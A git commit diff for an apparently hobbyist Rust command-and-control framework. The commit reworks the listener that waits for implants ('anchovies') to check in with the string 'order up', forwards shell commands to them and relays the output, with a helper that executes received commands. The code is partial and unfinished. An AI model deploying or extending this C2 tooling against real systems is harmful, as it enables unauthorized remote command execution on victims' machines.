c5673c32e65f871b62aabd3307b4fdffde55c9fb
Robster4911 <robbieheine@gmail.com>
2022-10-26 17:11:53 -0400

    Listener Rework [-] Removed use of UdpSockets for thread communication [+] Implemented use of Mutex wrapper to share data between threads [+] Added short demo to show that thread communication is working

--- src/bin/listener.rs
+++ src/bin/listener.rs
@@ -1,5 +1,8 @@
 use std::net::{SocketAddr, UdpSocket, TcpListener};
+use std::{thread, time};
+use std::sync::{Arc, Mutex};
 use crabby_patty_formula::*;
+use std::mem::drop;
 
 // Send packets over
 //  - Bytes (UDP, TCP)
@@ -9,14 +12,43 @@ use crabby_patty_formula::*;
 // Defines essential functions
 
 fn main(){
-    let port: u16 = 420;
+    let port: u16 = 2120;
     let id: u64 = 69;
-    let protocol: &str = "tcp";
+    let protocol: &str = "udp";
 
     let mut lsn = new_lsn(id);
 
     let address = SocketAddr::from(([127, 0, 0, 1], port));
 
-    //***Does Not Build with this; Feature for future implementation****
-    //crabby_patty_formula::lsn_run(&mut lsn, protocol, address, tx, rx);
+    let mut sb: Arc<Mutex<SharedBuffer>> = Arc::new(Mutex::new(SharedBuffer {
+        cc: 0,
+        buff: [0; 2048].to_vec(),
+    }));
+
+    let mut sb_arc = Arc::clone(&sb);
+
+    // spawn the listnener
+    let thr = thread::spawn(move ||
+        {
+            crabby_patty_formula::lsn_run(&mut lsn, protocol, address, &mut sb);
+        }
+    );
+
+    // send some control codes
+    let mut code: u8 = 1;
+    while code < 7 {
+        if code == 2 {
+            code += 1;
+        }
+        let mut buffer = sb_arc.lock().unwrap();
+        buffer.cc = code;
+        drop(buffer);
+        thread::sleep(time::Duration::from_millis(10));
+        buffer = sb_arc.lock().unwrap();
+        println!("{} {}", code, String::from_utf8_lossy(&buffer.buff[..]));
+        code += 1;
+        thread::sleep(time::Duration::from_millis(10));
+    }
+
+    thr.join().unwrap();
 }
--- src/lib.rs
+++ src/lib.rs
@@ -7,12 +7,15 @@ use std::process::Command;
 use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
 use std::io::{Read, Write};
 use std::format;
+use std::sync::{Arc, Mutex};
+use std::time::Duration;
+use std::thread;
 
 /*****************************/
 /*     USEFUL STRUCTURES     */
 /*****************************/
 
-pub struct sysinfo {
+pub struct SystemInfo {
     arch: String,
     os: String,
     hostname: String,
@@ -36,12 +39,17 @@ pub fn new_lsn(i: u64) -> Listener {
     return ret;
 }
 
-pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, port: u16){
+pub struct SharedBuffer {
+    pub cc: u8,
+    pub buff: Vec<u8>,
+}
+
+pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
     match protocol {
-        "udp" => listen_udp(lsn, address, port),
-        "tcp" => listen_tcp(lsn, address, port),
-        "http" => listen_tcp(lsn, address, port),
-        "dns" => listen_udp(lsn, address, port),
+        "udp" => listen_udp(lsn, address, sb),
+        "tcp" => listen_tcp(lsn, address, sb),
+        "http" => listen_tcp(lsn, address, sb),
+        "dns" => listen_udp(lsn, address, sb),
         &_ => todo!(),
     }
 }
@@ -51,15 +59,13 @@ pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, port: u1
 /****************************/
 
 // listens using a TcpListener
-fn listen_tcp(lsn: &mut Listener, address: SocketAddr, port: u16){
-    // Sets up the socket to relay data to the client over localhost
-    let mut relay = UdpSocket::bind(SocketAddr::from(([127, 0, 0, 1], port))).unwrap();
-
+fn listen_tcp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
     lsn.status = 1;
     lsn.tcp_sock = Some(TcpListener::bind(address).unwrap());
     println!("[+] Opening tcp listener on port {}", address.port());
     loop {
-        let cmd: u8 = rcv_client_command(lsn, &mut relay);
+        // Checks for commands from the client each iteration
+        let cmd: u8 = rcv_client_command(lsn, sb);
         if cmd == 2 {
             break;
         }
@@ -74,7 +80,7 @@ fn listen_tcp(lsn: &mut Listener, address: SocketAddr, port: u16){
                 if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
                     lsn.status = 2;
                     // switches to interact mode
-                    interact_tcp(lsn, &mut stream, &mut relay);
+                    interact_tcp(lsn, &mut stream, sb);
                     lsn.status = 1;
                 }
                 stream.shutdown(Shutdown::Both).expect("shutdown call failed");
@@ -86,29 +92,30 @@ fn listen_tcp(lsn: &mut Listener, address: SocketAddr, port: u16){
 }
 
 // listens using a UdpSocket
-fn listen_udp(lsn: &mut Listener, address: SocketAddr, port: u16){
-    // Sets up the socket to relay data to the client over localhost
-    let mut relay = UdpSocket::bind(SocketAddr::from(([127, 0, 0, 1], port))).unwrap();
-
+fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
     // Setup socket to listen for implant connection
     lsn.status = 1;
-    lsn.udp_sock = Some(UdpSocket::bind(address).unwrap());
+    lsn.udp_sock = Some(UdpSocket::bind(address).expect("Couldnt bind address"));
+    lsn.udp_sock.as_ref().expect("udp socket not initialized").set_read_timeout(Some(Duration::from_millis(5))).expect("set_read_timeout failed");
     println!("[+] Opening udp listener on port {}", address.port());
-    loop { // break loop if connection is made
+    loop {
         // Checks for commands from the client each iteration
-        let cmd: u8 = rcv_client_command(lsn, &mut relay);
+        let cmd: u8 = rcv_client_command(lsn, sb);
         if cmd == 2 {
             break;
         }
 
         let mut buffer = [0; 2048];
-        let (bytes, src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
+        let (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer) {
+            Ok((b, s)) => (b, s),
+            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+        };
 
         // replace insides of .contains() with whatever string/key we are using to verify connection
         if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
             lsn.status = 2;
             // switches to interact mode
-            interact_udp(lsn, src, &mut relay);
+            interact_udp(lsn, src, sb);
             lsn.status = 1;
         }
     }
@@ -117,39 +124,22 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, port: u16){
 
 // handles interaction with the implant
 // acts as a middleman between the implant and client
-fn interact_udp(lsn: &mut Listener, target: SocketAddr, relay: &mut UdpSocket) {
+fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>) {
     println!("[+] Connection established by listener {}", lsn.id);
     let mut is_interacting: bool = false;
     loop {
         // live interaction with the implant
         if is_interacting {
-            let mut buffer = [0;2048];
-            let (rbytes, relay_src) = relay.recv_from(&mut buffer).unwrap();
+
+
             // checks if client is terminating interaction with target_src
-            if rbytes == 1 && buffer[0] == 6 {
-                is_interacting = false;
-                let code: u8 = 3;
-                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
-            }
+
             // otherwise interact normally
-            else if rbytes != 0 {
-                // forward line to implant to execute on shell
-                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&buffer[..], target);
-                // recieve output and send it back to the client
-                buffer = [0;2048];
-                let (mut tbytes, mut target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
-                while tbytes == 0 && target_src != target {
-                    // keep recieving data on socket until more than zero bytes are recieved from the correct address
-                    buffer = [0;2048];
-                    (tbytes, target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
-                }
-                // forward output to client
-                relay.send_to(&buffer[..], relay_src);
-            }
+
         }
         else {
             // check for client commands
-            let cc: u8 = rcv_client_command(lsn, relay);
+            let cc: u8 = rcv_client_command(lsn, sb);
             match cc {
                 // go back to listening mode
                 3 => {
@@ -160,25 +150,20 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, relay: &mut UdpSocket) {
                 },
                 // send a single line command to the implant to execute
                 4 => {
-                    // recieve the string as bytes from the client
-                    let mut buffer = [0;2048];
-                    let (_rbytes, relay_src) = relay.recv_from(&mut buffer).unwrap();
-                    // send control code to implant specifying single-line command execution
-                    let code: u8 = 1;
-                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
-                    // forward the command to the implant
-                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&buffer[..], target);
-                    // recieve the output from the implant
-                    buffer = [0;2048];
-                    let (mut tbytes, mut target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
-                    // forward output to client, making sure the network address of the implant is valid
-                    while tbytes == 0 && target_src != target {
-                        // keep recieving data on socket until more than zero bytes are recieved from the correct address
-                        buffer = [0;2048];
-                        (tbytes, target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
+                    let mut flag: bool = true;
+                    while flag {
+
+                        let mut sb_copy = sb.lock().unwrap();
+                        if !vec_is_zero(&sb_copy.buff) {
+                            let code: u8 = 1;
+                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
+                            flag = false;
+                        }
+                        else {
+                            thread::sleep(Duration::from_millis(10));
+                        }
                     }
-                    // forward output to client
-                    relay.send_to(&buffer[..], relay_src);
                 },
                 // tell implant to create a shell and begin interacting with it
                 5 => {
@@ -192,7 +177,7 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, relay: &mut UdpSocket) {
     }
 }
 
-fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, relay: &mut UdpSocket) {
+fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<SharedBuffer>>) {
     println!("[+] Connection established by listener {}", lsn.id);
     // TODO
 }
@@ -207,15 +192,18 @@ fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, relay: &mut UdpSocke
 // 4 => prepare to send_cmd to an anchovy
 // 5 => begin shell on anchovy
 // 6 => terminate shell on anchovy
-fn rcv_client_command(lsn: &mut Listener, relay: &mut UdpSocket) -> u8 {
-    let mut buffer = [0; 1];
-    let (_bytes, _src) = relay.recv_from(&mut buffer).unwrap();
+fn rcv_client_command(lsn: &mut Listener, sb: &mut Arc<Mutex<SharedBuffer>>) -> u8 {
+    let mut sb_ref = sb.lock().unwrap();
     // only action needed to be taken inside this function is to send back listener info
-    if buffer[0] == 1 {
+    if sb_ref.cc == 1 {
         let mut lsn_info = get_lsn_info(lsn);
         // TODO: send lsn_info back to client
     }
-    return buffer[0];
+    // just for testing
+    let cc = sb_ref.cc;
+    let confirm = format!("Control Code Recieved: {cc}");
+    sb_ref.buff = confirm.as_bytes().to_vec();
+    return sb_ref.cc;
 }
 
 // Returns a string containing the full info of a given listener
@@ -281,4 +269,18 @@ pub fn execute_cmd(s: String) -> String {
         let cmd = Command::new(s).output().unwrap();
         return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
     }
+}
+
+/*******************************/
+/*     MISC HELPER METHODS     */
+/*******************************/
+
+// returns true if the vector is all zero
+pub fn vec_is_zero(buffer: &Vec<u8>) -> bool {
+    for byte in buffer.into_iter() {
+        if *byte != 0 {
+            return false;
+        }
+    }
+    return true;
 }
